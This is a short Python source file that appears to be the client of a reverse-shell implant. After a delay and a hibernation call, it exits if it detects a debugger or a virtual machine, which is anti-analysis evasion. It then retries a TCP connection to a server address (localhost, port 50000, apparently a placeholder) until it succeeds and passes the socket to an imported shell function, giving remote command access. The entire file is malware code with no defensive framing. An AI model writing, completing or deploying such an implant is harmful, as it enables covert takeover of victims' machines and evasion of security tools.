import os
import time
import socket
from shell import shell
from Features.Features import Features

def main():
    time.sleep(15)
    
    serv_ip = "127.0.0.1"
    serv_port = 50000
    
    features = Features()
    
    features.hibernation(1, 0, 0, 0, 7200)
    
    if features.is_debugging():
        os._exit(1)
    if features.is_virtualizing():
        os._exit(1)
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        try:
            sock.connect((serv_ip, serv_port))
            break
        except socket.error:
            time.sleep(1)
            
    try:
        shell(sock)
    finally:
        sock.close()
        print("Connection closed.")

if __name__ == "__main__":
    main()